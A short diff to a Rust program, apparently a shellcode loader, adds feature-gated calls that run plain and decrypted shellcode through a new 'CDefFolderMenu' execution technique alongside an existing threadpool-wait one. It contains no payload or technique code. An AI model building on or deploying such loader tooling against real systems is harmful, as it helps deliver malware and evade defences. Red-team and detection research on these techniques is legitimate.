@@ -235,6 +235,9 @@ fn main() {
 
         #[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
         execution::shellcode_execute_threadpoolwait(shellcode.clone());
+
+        #[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+        execution::shellcode_execute_cdeffoldermenu(shellcode.clone());
     }
 
     // =======================================================================
@@ -369,6 +372,9 @@ fn main() {
 
             #[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
             execution::shellcode_execute_threadpoolwait(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+            execution::shellcode_execute_cdeffoldermenu(decrypted_shellcode.clone());
         }
     }
 }
